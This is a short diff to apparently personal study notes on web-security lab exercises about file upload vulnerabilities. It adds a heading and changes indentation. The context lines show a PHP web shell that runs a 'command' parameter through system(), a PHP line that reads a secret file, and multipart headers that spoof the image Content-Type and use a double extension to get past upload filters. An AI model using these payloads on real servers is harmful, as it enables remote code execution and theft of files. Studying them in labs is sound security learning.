@@ -1,8 +1,8 @@
 `<?php echo system($_GET['command']); ?>`
 #### Web shell upload via Content-Type restriction bypass
 1. Content-Disposition: form-data; name="avatar"; filename="img4.php"
-	Content-Type: image/png
-	**Sometimes Works**
+        Content-Type: image/png
+        **Sometimes Works**
 #### Web shell upload via path traversal
 
 `<?php echo file_get_contents('/home/carlos/secret'); ?>`
@@ -23,3 +23,5 @@ Content-Disposition: form-data; name="avatar"; filename="shell.php.jpg"
 Content-Type: application/x-php
 =================================================================================
 ```
+
+#### Remote code execution via polyglot web shell upload
